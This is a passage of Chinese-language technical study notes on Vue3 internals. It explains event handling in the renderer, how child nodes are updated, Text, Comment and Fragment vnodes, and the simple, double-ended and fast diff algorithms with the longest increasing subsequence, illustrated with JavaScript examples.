比如更新事件时，直接更新 `invokers.value` 即可\n\t\t\t- 没必要每次都调用 `removeEventListener` 来移除上一次绑定的事件？\n\t- `el._vei[key]` 中存储着**所有事件信息**，它的数据结构可能是一个**数组**，比如同一事件如 `click` 有多个回调 callback，所以才有 `invoker.value.forEach(fn => fn(e))`\n\t- 它还能解决`事件冒泡`和`更新相互冲突`的问题，见下面 \n\n## 11. 事件冒泡与更新时机问题\n\n看如下代码：\n\n```js\nconst {effect, ref} = VueReactivity\nconst bol = ref(false)\n\neffect(() => {\n    const vnode = {\n        type: 'div',\n        props: bol.value ? {\n            onClick: () => { \n                alert('父元素 clicked')\n            }\n        } : {},\n        children: [\n            {\n                type: 'p',\n                props: {\n                    onClick: () => {\n                        bol.value = true\n                    }\n                },\n                children: 'text'\n            }\n        ]\n    }\n    renderer.render(vnode, document.querySelector('#app'))\n})\n```\n\n一开始 `bol` 为 `false`， \n- 所以 `div` 没有回调事件 ， `p` 有回调 ， 所以 `正常预期` 是 点击 `p 元素`，冒泡到 `div` , 不 `alert`。\n- 但是，竟然执行了，为什么呢？\n\t- 因为 `bol 是响应数据`， 变化了会导致 副作用执行，然后就给 div 绑定了事件；\n\n如何解决呢？符合正常预期。如下代码：\n\n![|616](https://od-1310531898.cos.ap-beijing.myqcloud.com/202305252000226.png)\n\n即，屏蔽所有`绑定时间 晚于 真正执行时间`的执行 。\n\n## 12. 如何更新子节点\n\n6种情况：`【新节点、老节点】 * 【文本节点、一组节点、null】`\n\n需要在特定情况 调用 `旧节点卸载操作` 和 `新加节点的挂载操作` ，如下代码：\n\n```js\n\nfunction patchChildren(oldNode, newNode, container) {\n    // 新节点是否是文本节点\n    if (typeof newNode.children === 'string') {\n        // 老节点是仅在是是一组节点时，才需要遍历卸载\n        if (Array.isArray(oldNode.children)) {\n            oldNode.children.forEach((c) => unmount(c))\n        }\n        setElementText(container, newNode.children)\n    // 新节点是一组节点\n    } else if (Array.isArray(newNode.children)) {\n        // 老节点是一组节点\n        if (Array.isArray(oldNode.children)) {\n            oldNode.children.forEach(c => unmount(c))\n            newNode.children.forEach(c => patch(null, c, container))\n        } else {\n            setElementText(container, '')\n            newNode.children.forEach(c => patch(null, c, container))\n        }\n    } else {\n        if (Array.isArray(oldNode.children)) {\n            oldNode.children.forEach(c => unmount(c))\n        } else if (typeof oldNode.children === 'string') {\n            setElementText(container, '')\n        }\n    }\n}\n```\n\n其实上面代码很简单粗暴，比如，如果旧节点是一组节点，简单粗暴的全部卸载，再全部挂载新节点操作；\n\n其实更好的方式是 `使用 Diff 算法，最大可能利用`，以提高性能。\n\n## 13. 文本节点与注释节点\n\n- **文本节点**：\n\t- 用于表示纯文本\n- **注释节点**：\n\t- 用于在HTML中添加注释，这些注释不会显示在页面上但可能对开发者有帮助。\n- 如何使用 `vnode` 描述真实场景中的 `文本节点` 与 `注释节点` ？\n\t- 答案是：使用 `Symbol()` ，如下代码：\n\t\t- 使用 Symbol 的原因：\n\t\t    - Symbol 是 JavaScript 中的一种基本数据类型，用于**创建唯一的标识符**。\n\t\t    - 通过使用 Symbol，我们可以创建独特的标识来代表**文本节点**和**注释节点**。\n\t\t- 使用 Symbol 的**优势** ，我们可以清晰且安全地在虚拟DOM中定义和==区分不同类型的节点==\n\t\t\t- 统一的节点表示方式\n\t\t\t- 清晰的类型区分\n\t\t\t- 易于在渲染过程中进行特殊处理\n\n```js hl:1,2\nconst Text = Symbol();\nconst Comment = Symbol();\n\nconst vnode1 = {\n  type: Text,\n  children: 'Some Text'\n}\n\nconst vnode2 = {\n  type: Comment,\n  children: 'Some Comment'\n}\n```\n\n然后根据具体节点类型，在挂载、更新、卸载等操作时根据具体情况处理即可。\n\n## 14. Fragment\n\n存在的意义是什么 ？ 其实就是类似于React 的 `<></>` 和 `<fragment>`\n\n如下 vnode ：\n\n```js\nconst Fragment = Symbol()\nconst newVnode = {\n  type: 'div',\n  children: [\n    {\n      type: Fragment,\n      children: [\n        { type: 'p', children: 'text 1' },\n        { type: 'p', children: 'text 2' },\n        { type: 'p', children: 'text 3' }\n      ]\n    },\n    { type: 'section', children: '分割线' }\n  ]\n}\n```\n\n>  **在挂载、更新、卸载操作是，不处理它本身，只处理它的子节点即可**\n","BBFZfsjJ":"\n# Vue3 的 diff 算法\n\n`#vue` `#R2` \n\n\n>  - [41. React 的 Diff 算法](/post/xnovmtPU.html)\n>  - [14. Vue3 的 Diff 算法复杂的分析](/post/nqGBNMVr.html)\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n### 1.1. 快速 Diff 算法 + 最长递增子序列\n\n是一种**同级节点间的比较算法**\n\n#### 1.1.1. 原理\n\n主要分为以下步骤：\n1. 预处理：处理**新旧两组节点的头尾节点**\n2. 特殊处理：处理**新增和删除**的情况\n3. 最长递增子序列：处理**未知子序列**\n\n#### 1.1.2. 优势\n\n1. 预处理优化：\n    - 快速处理头尾相同的节点\n    - 减少需要处理的节点数量\n2. 空间复杂度优化：\n    - 使用 Map 存储索引映射\n    - 避免多余的数组操作\n3. 时间复杂度优化：\n    - 最长递增子序列算法优化移动操作\n    - 减少 DOM 操作次数\n4. 内存优化：\n    - 复用已有节点\n    - 最小化 DOM 操作\n\n### 1.2. 快速 Diff 算法 和 双端 Diff 算法的区别\n\n#### 1.2.1. 基本原理对比\n\n双端 Diff 算法：→ ==vue 2==\n- 同时对新旧两组节点的头尾进行比较（4 种比较方式）\n- 需要维护 4 个指针（新头、新尾、旧头、旧尾）\n快速 Diff 算法： → ==vue3==\n- 只处理头尾相同的节点\n- 然后处理剩余未知序列，使用**最长递增子序列**优化移动\n\n#### 1.2.2. 算法复杂度对比\n\n- 双端 Diff：\n\t- 时间复杂度相对较高\n\t- 需要进行 4 次比较\n- 快速 Diff：\n\t- 只需处理头尾相同节点\n\t- 使用 Map 优化查找过程\n\n#### 1.2.3. 节点移动策略\n\n- 双端 Diff：\n\t- 可能产生多次DOM操作\n\t- 逐个移动节点\n- 快速 Diff：\n\t- 使用最长递增子序列\n\t- 最小化移动操作\n\n#### 1.2.4. 性能对比\n\n```js\n// 场景1：节点顺序变化\n// 原始顺序：[1, 2, 3, 4, 5]\n// 新顺序：[1, 3, 2, 4, 5]\n\n// 双端 Diff\n// 需要多次比较和移动操作\n\n// 快速 Diff\n// 1. 处理头部 [1]\n// 2. 处理尾部 [4, 5]\n// 3. 使用最长递增子序列处理 [2, 3]\n```\n\n#### 1.2.5. 适用场景\n\n 双端 Diff 适合：\n \n```js\n// 1. 对称性变化\nconst oldNodes = ['A', 'B', 'C', 'D']\nconst newNodes = ['D', 'C', 'B', 'A']\n\n// 2. 小规模列表更新\nconst oldList = ['item1', 'item2', 'item3']\nconst newList = ['item2', 'item3', 'item1']\n```\n\n快速 Diff 适合：\n\n```js\n// 1. 大规模列表更新\nconst oldList = [/* 大量数据 */]\nconst newList = [/* 大量数据 */]\n\n// 2. 带有明显头尾相同部分的更新\nconst oldNodes = ['A', 'B', 'C', 'D', 'E']\nconst newNodes = ['A', 'B', 'X', 'Y', 'E']\n```\n\n#### 1.2.6. 优缺点总结\n\n双端 Diff：\n- 优点：\n\t- 实现相对简单\n\t- 对小规模更新效果好\n- 缺点：\n\t- 需要多次比较\n\t- 性能可能不如快速 Diff\n快速 Diff：\n- 优点：\n\t- 性能更好\n\t- 移动操作最小化\n- 缺点：\n\t- 实现相对复杂\n\t- 需要额外的空间存储索引映射\n\n### 1.3. Vue2 和 Vue3 的选择\n\n- Vue 2.x 使用的是**双端 Diff 算法**\n- Vue 3.x 改用了**快速 Diff 算法 +  最长递增子序列**\n\t- 最长递增子序列排序的依据是\n\t\t- ==节点的索引==\n\t\t\t- 则需要`根据节点的索引关系，构造出一个最长递增子序列`\n\t\t\t- 最长递增子序列所指向的节点即为==不需要移动的节点==\n\n\n> 以上是总结内容，下面看看如何 Vue 的 Diff 优化思路\n\n## 2. 不做任何 diff 优化 的渲染\n\n看个例子，由 `vnode1` 变成 `vnode2` ，如果按照 [12. Vue3 渲染器的原理和实现](/post/yfbT1DXt.html) 中的简易实现，即 `先卸载所有，再挂载所有`，那么：我们需要 `8 次 DOM 操作`\n\n- 卸载所有旧子节点，需要 3 次 DOM 删除操作\n- 挂载所有新子节点，需要 3 次 DOM 添加操作\n\n```javascript\nconst VNode1 = {\n    type: 'div',\n    children: [\n        {type: 'p', children: '1'},\n        {type: 'p', children: '2'},\n        {type: 'p', children: '3'},\n    ]\n}\n\nconst VNode2 = {\n    type: 'div',\n    children: [\n        {type: 'p', children: '4'},\n        {type: 'p', children: '5'},\n        {type: 'p', children: '6'},\n    ]\n}\n```\n\n如果，我们做 diff 算法，我们发现，上面的 vnode 只是 `文本内容`发生了变化，所以只需要更新文本节点即可，最终只需要 `3 次 DOM 操作`\n\n所以，对于 `这新旧两组节点`，我们以下优化策略：\n\n- 比较新旧两组节点的个数，新组节点多，则说明有新的节点需要挂载，否则有旧的节点需要卸载\n- 另外，我们需要 `遍历长度较段的节点`，进行 `patch`，保证尽可能多的 patch，避免更多的 DOM 操作\n\n![图片&文件](./files/20241103-3.png)\n\n## 3. 简单 Diff 算法：考虑可复用 DOM ，减少 DOM 操作\n\n还是看个例子，按照上面的优化策略，还是得 `6 次 DOM 操作` \n- 但是我们发现，其实每个节点的区别仅仅在于 `位置移动了`\n- 所以我们需要考虑如何**复用** DOM，而不是`销毁了重建`\n\n```javascript\nconst vNode1 = {\n    type: 'div',\n    children: [\n        {type: 'p', children: '4'},\n        {type: 'div', children: '2'},\n        {type: 'h1', children: '1'},\n        {type: 'span', children: '3'}\n    ]\n}\n\nconst vNode2 = {\n    type: 'div',\n    children: [\n        {type: 'div', children: '2'},\n        {type: 'span', children: '3'},\n        {type: 'p', children: '4'},\n        {type: 'h1', children: '1'}\n    ]\n}\n\n```\n\n基于上，我们需要思考：\n\n### 3.1. 如何找可复用的节点？\n\n答案是唯一 `key` , 最简单的方式，我们遍历（嵌套遍历）新旧节点，然后找到 `key 相同`的新旧节点，然后打补丁 `patch(oldNode , newNode)` ，换另外一种说明，即拿着一组节点，去旧节点组中查找，是否有可复用的节点，复用的依据是` key` ，下面是代码描述：\n\n```javascript hl:8\n // 遍历新的 children\n  for (let i = 0; i < newChildren.length; i++) {\n    const newVNode = newChildren[i]\n    let j = 0\n    // 遍历旧的 children\n    for (j; j < oldChildren.length; j++) {\n      const oldVNode = oldChildren[j]\n      // 如果找到了具有相同 key 值的两个节点，则调用 `patch` 函数更新之\n      if (newVNode.key === oldVNode.key) {\n        patch(oldVNode, newVNode, container)\n        break // 这里需要 break\n      }\n    }\n  }\n```\n\n### 3.2. 如何判断节点是否需要移动？\n\n这里直接给结论，初始化`最大索引值为 0`，拿着新的节点，尝试去旧的节点组去找具有相同` key` 值的，更新 `最大索引值`；如果后续后续查找过程中，在旧的的节点组中招到的索引 小于 这个 `最大索引值`，则需要移动。\n\n代码描述如下图：\n\n![|696](https://832-1310531898.cos.ap-beijing.myqcloud.com/feca43d0e736ad65e3a9a4b0df08fd4e.png)\n\n下面是具体代码：\n\n```javascript\n  const oldChildren = n1.children\n  const newChildren = n2.children\n  // 遍历新的 children\n  for (let i = 0; i < newChildren.length; i++) {\n    const newVNode = newChildren[i]\n    let j = 0\n    // 遍历旧的 children\n    for (j; j < oldChildren.length; j++) {\n      const oldVNode = oldChildren[j]\n      // 如果找到了具有相同 key 值的两个节点，则调用 `patch` 函数更新之\n      if (newVNode.key === oldVNode.key) {\n        patch(oldVNode, newVNode, container)\n        if (j < lastIndex) {\n          // 需要移动\n        } else {\n          // 更新 lastIndex\n          lastIndex = j\n        }\n        break // 这里需要 break\n      }\n    }\n  }\n```\n\n上面的 `patch 代码`，因为可以`复用DOM`，所以会在 `pathElement` 中把 `DOM 引用（ 即oldNode.el ）`直接给新的节点，达到复用的效果，如下代码：\n\n```javascript hl:2\nfunction patchElement(n1, n2) {\n    const el = n2.el = n1.el\n    // 。。。 其他代码\n}\n```\n\n### 3.3. 如何移动可复用节点？\n\n首先，移动节点，移动的是`真实的 DOM`，你想嘛，要复用DOM 节点嘛。所以，会调用 DOM `insertBefore(el, anchor)`操作\n\n如下图：\n\n![|616](https://832-1310531898.cos.ap-beijing.myqcloud.com/77b571bd0ac2e148ce354da1436cd76f.png)\n\n最终代码：\n\n```javascript\n      const oldChildren = n1.children\n      const newChildren = n2.children\n      let lastIndex = 0\n      // 遍历新的 children\n      for (let i = 0; i < newChildren.length; i++) {\n        const newVNode = newChildren[i]\n        let j = 0\n        let find = false\n        // 遍历旧的 children\n        for (j; j < oldChildren.length; j++) {\n          const oldVNode = oldChildren[j]\n          // 如果找到了具有相同 key 值的两个节点，则调用 `patch` 函数更新之\n          if (newVNode.key === oldVNode.key) {\n            find = true\n            patch(oldVNode, newVNode, container)\n            if (j < lastIndex) {\n              // 需要移动\n              const prevVNode = newChildren[i - 1]\n              if (prevVNode) {\n                const anchor = prevVNode.el.nextSibling\n                insert(newVNode.el, container, anchor)\n              }\n            } else {\n              // 更新 lastIndex\n              lastIndex = j\n            }\n            break // 这里需要 break\n          }\n        }\n```\n\n`insert` 依赖于原生 `insertBefore` 方法，如下：\n\n```javascript\ninsert(el, parent, anchor = null) {\n    parent.insertBefore(el, anchor)\n},\n```\n\n### 3.4. 如何添加新节点\n\n如下图：\n\n![|624](https://832-1310531898.cos.ap-beijing.myqcloud.com/6cc5d14fb3a1b3474c6c5f21f60b2eaf.png)\n\n直接看代码，注意解释部分：\n\n![|696](https://832-1310531898.cos.ap-beijing.myqcloud.com/82f0cb40de7c60fe8f2cab6f9c1b3ffa.png)\n\n具体代码部分：\n\n```javascript\nif (!find) {\n    const prevVNode = newChildren[i - 1]\n    let anchor = null\n    if (prevVNode) {\n        anchor = prevVNode.el.nextSibling // 下一个兄弟节点\n    } else {\n        anchor = container.firstChild // 是第一个元素\n    }\n    patch(null, newVNode, container, anchor)\n}\n```\n\n### 3.5. 删除不存在的元素\n\n![|568](https://832-1310531898.cos.ap-beijing.myqcloud.com/fe2007501f0e9fc182f02cb05395abaa.png)\n\n这个时候，我们需要遍历 `旧的节点组`，代码如下：\n\n```javascript\n\n// 遍历旧的节点\nfor (let i = 0; i < oldChildren.length; i++) {\n    const oldVNode = oldChildren[i]\n    // 拿着旧 VNode 去新 children 中寻找相同的节点\n    const has = newChildren.find(\n        vnode => vnode.key === oldVNode.key\n    )\n    if (!has) {\n        // 如果没有找到相同的节点，则移除\n        unmount(oldVNode)\n    }\n}\n```\n\n### 3.6. 总结\n\n- Diff 算法用来计算`两组子节点`的差异，并试图最大程度地复用 DOM 元素。\n- 遍历新旧两组子节点中`数量较少`的那一组，并逐个调用 patch 函数进行打补丁，然后比较新旧两组子节点的数量\n\t- 如果新的一组子节点数量更多，说明有新子节点需要挂载\n\t- 否则说明在旧的一组子节点中，有节点需要卸载\n- 虚拟节点中 key 属性的作用，它就像虚拟节点 的“身份证号”。\n\t- 在更新时，渲染器通过 key 属性找到`可复用`的节点， \n\t- 然后尽可能地通过 DOM 移动操作来完成更新，避免过多地对 DOM 元素进行销毁和重建。\n- 简单 Diff 算法的核心逻辑是，拿新的一组子节点中的节点去旧的一组子节点中寻找可复用的节点。\n\t- 如果找到了，则记录该节点的`位置索引`。我们把这个位置索引称为`最大索引`。\n\t- 在整个更新过程中，如果一个节点的索引值`小于`最大索引，则说明该节点对应的真实 DOM 元素需要移动。\n\n## 4. 双端 Diff 算法\n\n### 4.1. 先看看一个示例\n\n如下图，如果使用前文所使用的的 简易 Diff 算法，那么需要移动 `两次 DOM 操作`\n\n![|664](https://832-1310531898.cos.ap-beijing.myqcloud.com/af82e1f002de149760f6171ff125bad5.png)\n\n但其实，我只需要`移动一次DOM`即可，即 把 P3 移动 P1 后面 即可，如下图：\n\n![|736](https://832-1310531898.cos.ap-beijing.myqcloud.com/f9ee3a586037014fc072543ba6206a29.png)\n\n### 4.2. 理想情况双端算法处理\n\n具体双端算法流程图，参考 `fj`\n[https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=167-296&t=i3ztBjIOmSVuaLfT-4](https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=167-296&t=i3ztBjIOmSVuaLfT-4)\n\n部分代码如下：\n\n```javascript hl:12\nfunction patchKeyedChildren(n1, n2, container) {\n    const oldChildren = n1.children\n    const newChildren = n2.children\n    let oldStartIdx = 0\n    let oldEndIdx = oldChildren.length - 1\n    let newStartIdx = 0\n    let newEndIdx = newChildren.length - 1\n    let oldStartVNode = oldChildren[oldStartIdx]\n    let oldEndVNode = oldChildren[oldEndIdx]\n    let newStartVNode = newChildren[newStartIdx]\n    let newEndVNode = newChildren[newEndIdx]\n    while (oldStartIdx <= oldEndIdx && newStartIdx <= newEndIdx) {\n        //  第1步：\n        if (oldStartVNode.key === newStartVNode.key) {\n            patch(oldStartVNode, newStartVNode, container)\n            oldStartVNode = oldChildren[++oldStartIdx]\n            newStartVNode = newChildren[++newStartIdx]\n        //  第2步：\t\n        } else if (oldEndVNode.key === newEndVNode.key) {\n            patch(oldEndVNode, newEndVNode, container)\n            oldEndVNode = oldChildren[--oldEndIdx]\n            newEndVNode = newChildren[--newEndIdx]\n        //  第3步：\t\n        } else if (oldStartVNode.key === newEndVNode.key) {\n            patch(oldStartVNode, newEndVNode, container)\n            insert(oldStartVNode.el, container, newEndVNode.el.nextSibling)\n            oldStartVNode = oldChildren[++oldStartIdx]\n            newEndVNode = newChildren[--newEndIdx]\n        //  第4步：\n        } else if (oldEndVNode.key === newStartVNode.key) {\n            // 步骤四：oldEndVNode 和 newStartVNode 比对\n            patch(oldEndVNode, newStartVNode, container)\n            insert(oldEndVNode.el, container, oldStartVNode.el)\n            oldEndVNode = oldChildren[--oldEndIdx]\n            newStartVNode = newChildren[++newStartIdx]\n        }else{\n            //********* 非理想情况下 *********\n        }\n    }\n}\n```\n\n是的，双端，4 个指针，按照一定规则移动，但上面代码中 `else部分` 是干啥的 ？ 看下面图：\n\n![|752](https://832-1310531898.cos.ap-beijing.myqcloud.com/d11a8399be49347401c33b5b4af09f78.png)\n\n前 4 步骤都没法命中，所以才需要`在 else 里`处理。\n\n### 4.3. 非理想情况下双端算法\n\n看流程图：\n[https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=169-371&t=i3ztBjIOmSVuaLfT-4](https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=169-371&t=i3ztBjIOmSVuaLfT-4)\n部分代码截图：\n![|752](https://832-1310531898.cos.ap-beijing.myqcloud.com/573bdf003191c59daf303c4704b95e47.png)\n\n上面第 5 步，如果找不到可以复用的节点呢？ 说明需要`添加节点`了，见下面：\n\n### 4.4. 新增元素\n\n![|776](https://832-1310531898.cos.ap-beijing.myqcloud.com/f2e1fd7b2e3813914e1bdf248ab2e122.png)\n[https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=169-503&t=i3ztBjIOmSVuaLfT-4](https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=169-503&t=i3ztBjIOmSVuaLfT-4)\n\n### 4.5. 移动元素\n\n![](https://832-1310531898.cos.ap-beijing.myqcloud.com/5bd7fe0a2f85f1d5f9332ef9f9a5bce9.png)\n\n详见流程图：\n[https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=169-542&t=i3ztBjIOmSVuaLfT-4](https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=169-542&t=i3ztBjIOmSVuaLfT-4)\n\n### 4.6. 最后总结\n\n- 顾名思义，双端 Diff 算法指的是，在新旧两组子节点的四个端点之间分别进行比较， 并试图找到可复用的节点\n- 相较于`简单 Diff 算法`，`双端Diff 算法`的优势在于\n\t- 同样的更新场景，执行的 DOM 操作更少一点而已。\n\n## 5. 快速 Diff 算法 + 最长递增子序列\n\nVue3 是通过`双端对比`+`最长递增子序列算法`得出**最小的更新消耗**。下面我们先看看 `快速 Diff 算法`\n\n### 5.1. 相同的前置元素和后置元素\n\n![|616](https://832-1310531898.cos.ap-beijing.myqcloud.com/c0b03bd8b5104dedc29b8d1ec9e8d825.png)\n\n### 5.2. 添加的节点的情况\n\n[https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=189-731&t=2Hh2yCqllM2zgzaD-4](https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=189-731&t=2Hh2yCqllM2zgzaD-4)\n\n### 5.3. 删除节点的情况\n\n[https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=189-695&t=2Hh2yCqllM2zgzaD-4](https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=189-695&t=2Hh2yCqllM2zgzaD-4)\n\n### 5.4. 更复杂的情况\n\n[https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=189-731&t=2Hh2yCqllM2zgzaD-4](https://www.figma.com/file/hT9k2YbVvV1UIITtUmbJ0C/2023.05.LOG?type=whiteboard&node-id=189-731&t=2Hh2yCqllM2zgzaD-4)\n\n### 5.5. 最后\n\n`快速 Diff 算法`在实测中性能最优。它借鉴了`文本 Diff 中`的 `预处理思路`，\n1. 先处理`新旧两组子节点`中`相同的前置节点`和`相同的后置节点`。 \n2. 当前置节点和后置节点全部处理完毕后，\n\t- 如果**无法简单地通过挂载新节点或者卸载已经不存在的节点**来完成更新\n\t\t- 则需要`根据节点的索引关系，构造出一个最长递增子序列`。\n\t\t\t- `最长递增子序列所指向的节点`即为`不需要移动的节点`。\n\n","nqGBNMVr":"\n# Vue3 的 Diff 算法复杂的分析\n\n`#diff` `#vue3` \n\n>  另外可见 [41. React 的 Diff 算法](/post/xnovmtPU.html)\n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- Vue3 的 Diff 算法通过多个步骤将时间复杂度从 `O(n³)` 优化到 `O(n)`\n\t- ① 只比较同层级节点，不跨层级比较\n\t- ② 使用 key 作为索引\n\t- ③ 预处理：快速路径\n\t\t- 头尾节点快速比对\n\t- ④ 进一步优化：\n\t\t- 使用==最长递增子序列==减少节点移动\n\n> 和 React 的优化思路类似，但 React 不是`双端比较`，也是不是`快速 Diff 算法`，而是`仅右移`\n\n## 2. **最初的树 Diff 问题**\n\n```js\n// 最原始的树 Diff 算法（O(n³)复杂度）\nfunction originalTreeDiff(oldTree, newTree) {\n  for (let i = 0; i < oldTree.length; i++) {      // O(n)\n    for (let j = 0; j < newTree.length; j++) {    // O(n)\n      findMinimumOperations(oldTree[i], newTree[j]) // O(n)\n    }\n  }\n}\n```\n\n## 3. **第一步优化：层级比较**\n\n```js\n// 只比较同层级节点，不跨层级比较\nfunction levelByLevelDiff(oldChildren, newChildren) {\n  // 只比较同一层级的节点\n  for (let i = 0; i < oldChildren.length; i++) {\n    for (let j = 0; j < newChildren.length; j++) {\n      if (oldChildren[i].key === newChildren[j].key) {\n        patch(oldChildren[i], newChildren[j])\n      }\n    }\n  }\n}\n```\n\n## 4. **第二步优化：使用 key 作为索引**\n\n```js\n// 使用 key 建立映射，避免无效比较\nfunction keyBasedDiff(oldChildren, newChildren) {\n  const oldKeyToIdx = {}\n  \n  // 建立 key 到索引的映射 O(n)\n  for (let i = 0; i < oldChildren.length; i++) {\n    oldKeyToIdx[oldChildren[i].key] = i\n  }\n  \n  // 直接通过 key 找到对应节点 O(1)\n  for (let i = 0; i < newChildren.length; i++) {\n    const newChild = newChildren[i]\n    const oldIndex = oldKeyToIdx[newChild.key]\n    if (oldIndex !== undefined) {\n      patch(oldChildren[oldIndex], newChild)\n    }\n  }\n}\n```\n\n## 5. **第三步优化：快速路径**\n\n```js\nfunction fastPathDiff(oldChildren, newChildren) {\n  let i = 0\n  const len = Math.min(oldChildren.length, newChildren.length)\n  \n  // 1. 从头部开始比对 O(n)\n  while (i < len && oldChildren[i].key === newChildren[i].key) {\n    patch(oldChildren[i], newChildren[i])\n    i++\n  }\n  \n  let oldEnd = oldChildren.length - 1\n  let newEnd = newChildren.length - 1\n  \n  // 2. 从尾部开始比对 O(n)\n  while (oldEnd >= i && newEnd >= i && oldChildren[oldEnd].key === newChildren[newEnd].key) {\n    patch(oldChildren[oldEnd], newChildren[newEnd])\n    oldEnd--\n    newEnd--\n  }\n  \n  // 3. 处理剩余节点\n  if (i > oldEnd) {\n    // 添加新节点\n    for (let j = i; j <= newEnd; j++) {\n      mount(newChildren[j])\n    }\n  } else if (i > newEnd) {\n    // 删除多余节点\n    for (let j = i; j <= oldEnd; j++) {\n      unmount(oldChildren[j])\n    }\n  }\n}\n```\n\n## 6. **最终优化：最长递增子序列**\n\n```js\nfunction optimizedDiff(oldChildren, newChildren) {\n  // ... 前面的快速路径处理 ...\n  \n  // 对剩余节点进行处理\n  const remainingOldChildren = oldChildren.slice(i, oldEnd + 1)\n  const remainingNewChildren = newChildren.slice(i, newEnd + 1)\n  \n  // 建立 key 到位置的映射\n  const keyToNewIndexMap = new Map()\n  for (let i = 0; i < remainingNewChildren.length; i++) {\n    keyToNewIndexMap.set(remainingNewChildren[i].key, i)\n  }\n  \n  // 找到最长递增子序列\n  const newIndexToOldIndexMap = new Array(remainingNewChildren.length)\n  for (let i = 0; i < remainingOldChildren.length; i++) {\n    const newIndex = keyToNewIndexMap.get(remainingOldChildren[i].key)\n    if (newIndex !== undefined) {\n      newIndexToOldIndexMap[newIndex] = i\n    }\n  }\n  \n  // 获取最长递增子序列的索引\n  const increasingSequence = getSequence(newIndexToOldIndexMap)\n  \n  // 从后向前遍历，移动节点\n  let j = increasingSequence.length - 1\n  for (let i = remainingNewChildren.length - 1; i >= 0; i--) {\n    if (j < 0 || i !== increasingSequence[j]) {\n      // 需要移动的节点\n      move(remainingNewChildren[i], container, anchor)\n    } else {\n      // 不需要移动的节点\n      j--\n    }\n  }\n}\n\n// 获取最长递增子序列\nfunction getSequence(arr) {\n  const p = arr.slice()\n  const result = [0]\n  let i, j, u, v, c\n  const len = arr.length\n  \n  for (i = 0; i < len; i++) {\n    const arrI = arr[i]\n    if (arrI !== 0) {\n      j = result[result.length - 1]\n      if (arr[j] < arrI) {\n        p[i] = j\n        result.push(i)\n        continue\n      }\n      u = 0\n      v = result.length - 1\n      while (u < v) {\n        c = ((u + v) / 2) | 0\n        if (arr[result[c]] < arrI) {\n          u = c + 1\n        } else {\n          v = c\n        }\n      }\n      if (arrI < arr[result[u]]) {\n        if (u > 0) {\n          p[i] = result[u - 1]\n        }\n        result[u] = i\n      }\n    }\n  }\n  u = result.length\n  v = result[u - 1]\n  while (u-- > 0) {\n    result[u] = v\n    v = p[v]\n  }\n  return result\n}\n```\n\n## 7. **优化的核心策略**\n\n- **空间换时间**：\n\t- 使用 Map 存储 key-index 映射\n- **预处理优化**：\n\t- 头尾节点快速比对\n- **算法优化**：\n\t- 使用最长递增子序列减少节点移动\n- **分治思想**：\n\t- 将问题分解为更小的子问题\n\n## 8. **时间复杂度分析**\n\n```js\n// 最终的时间复杂度分析\nfunction diffComplexity(oldChildren, newChildren) {\n  // 1. 建立 key-index 映射：O(n)\n  // 2. 头尾节点快速比对：O(n)\n  // 3. 查找最长递增子序列：O(nlogn)\n  // 4. 根据最长递增子序列移动节点：O(n)\n  \n  // 总体时间复杂度：O(nlogn)\n  // 在实际应用中，由于大多数情况下变更都很小，\n  // 实际性能接近 O(n)\n}\n```\n\n## 9. 总结\n\n- **算法层面**：\n\t- 只比较**同层级**节点\n\t- 使用 key 作为唯一标识\n\t- 采用双端比较\n\t- 使用最长递增子序列优化移动\n- **实现层面**：\n\t- 空间换时间\n\t- 预处理优化\n\t- 快速路径处理\n\t- 分治思想\n- **特殊情况处理**：\n\t- 新增节点\n\t- 删除节点\n\t- 移动节点\n\t- 更新节点\n\n这些优化策略综合使用，使得 **Vue3 的 Diff 算法在实际应用中能够达到接近线性的时间复杂度**，大大提升了性能。\n\n\n","PZCOPnJR":"\n# Vue3 事件与原生事件的关系和冒泡机制差异分析\n\n`#vue3` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- Vue3 的事件系统是==建立在原生 DOM 事件系统之上的==\n\t- vue3 事件就是对原生事件的封装而已\n\t- Vue3 不会覆盖原生事件\n- `@click` 和 `:onClick` ，都会执行，`@onClick` 优先级更高？\n\t- @click 会有额外的处理==？==\n- `自定义事件`不会冒泡，多个会覆盖\n\n\n---\n\n>  Vue3 的事件系统是==建立在原生 DOM 事件系统之上的==，它保持了原生事件的冒泡机制，同时提供了更便捷的事件处理方式和**自定义事件系统**\n\n\n- `@click` 等保持原生事件的特性\n- 自定义事件，比如 `@custom-event` 不会冒泡，和原生事件不太一样\n\n## 2. Vue3 中 `@click` 和 `:onClick` 的区别和执行顺序\n\n>  AI 的回答，也不一定，最好自己试一下\n\n### 2.1. 语法差异\n\n- `@click` 是 `v-on:click` 的简写，是 Vue 特有的事件处理语法 \n- `:onClick` 是通过 `v-bind` 绑定原生 DOM 的 onclick 事件处理器 \n\n### 2.2. 执行顺序\n\n1. `:onClick` (原生事件) 会先被触发\n2. `@click` (Vue 事件) 随后执行 \n\n>  -Vue 在内部==做了额外的处理==，所以会在原生事件之后触发\n\n### 2.3. 使用场景区别\n\n- `@click` 是 Vue 推荐的事件处理方式，可以直接在模板中使用，支持事件修饰符 \n- `:onClick` 